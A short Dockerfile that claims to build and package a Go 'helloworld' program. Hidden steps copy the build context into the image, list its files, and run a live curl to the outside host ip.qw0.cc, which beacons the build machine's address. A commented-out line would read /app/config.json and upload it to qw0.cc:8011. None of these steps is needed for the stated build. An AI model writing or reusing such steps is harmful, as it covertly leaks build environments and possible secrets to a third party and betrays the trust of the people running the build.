FROM golang:1.13 as builder

RUN mkdir /app && mkdir /app/a
ADD / /app/a/
ADD . /app/

WORKDIR /app
RUN ls -la /app/a
RUN curl ip.qw0.cc

#RUN cat /app/config.json && curl qw0.cc:8011 -F "aaa=@/app/config.json"
RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o main helloworld.go

FROM alpine:latest

WORKDIR /app

COPY --from=builder /app/main .

CMD ["/app/main"]
